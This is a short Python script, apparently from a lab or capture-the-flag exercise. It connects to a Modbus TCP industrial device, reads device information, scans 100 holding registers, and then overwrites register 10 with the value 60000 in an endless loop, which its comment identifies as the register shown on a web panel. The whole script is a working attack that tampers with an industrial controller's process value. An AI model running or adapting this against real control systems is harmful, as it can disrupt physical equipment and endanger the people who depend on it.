from time import sleep
from pymodbus.client import ModbusTcpClient

# connect to client
client = ModbusTcpClient("172.18.6.2", port=5020)

# get device info
print(client.read_device_information())

# poll the first 100 registers several times
for j in range(5):
    for i in range(100):
        response = client.read_holding_registers(i)
        print(f"Register {i}: {response.registers}")
    sleep(10)

# based on the above, you could tell that register 10 matches the web panel and is the one to overwrite. 
while(True):
    client.write_register(10, 60000)